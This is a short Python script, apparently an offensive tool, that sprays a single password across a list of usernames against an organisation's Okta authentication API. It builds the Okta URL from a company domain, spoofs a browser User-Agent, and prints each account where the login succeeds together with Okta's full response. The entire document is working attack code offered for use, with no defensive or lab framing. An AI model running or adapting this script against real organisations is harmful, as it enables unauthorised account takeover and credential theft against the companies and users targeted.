import requests
from requests.auth import HTTPBasicAuth
from optparse import OptionParser
import sys

if (len(sys.argv) < 7 and '-h' not in sys.argv):
    print("Usage:")
    print("python3 %s -p <password> -f <inputfile> -d <domain" % sys.argv[0])
    sys.exit(1)


parser = OptionParser()
parser.add_option("-p", "--password", help="Password to spray with")
parser.add_option("-f", "--inputfile", help="File with usernames")
parser.add_option("-d", "--domain", help="Company domain")
(options, args) = parser.parse_args()

domain = options.domain.partition('.')
domain2 = domain[0]

oktadomain = '%s.okta.com' % domain2

url = 'https://%s/api/v1/authn' % oktadomain
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}

print("+"*100)
print("Okta Password Sprayer")
print("+"*100)
password = options.password.strip()
print("Spraying...")
with open ("%s" % options.inputfile, "r") as oktausers:
    for line in oktausers:
        try:
            usr = line.strip()
            data = {"username":"{}".format(usr),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print("\033[92mlogin successful - %s:%s\033[0m" % (usr, password))
                print("\033[1mOkta Response Info:\033[0m")
                print(response.text)
                response.close()
            else:
                print("\033[91mAuthentication failed - %s:%s\033[0m" % (usr, password))
        except Exception as e:
            print(e)



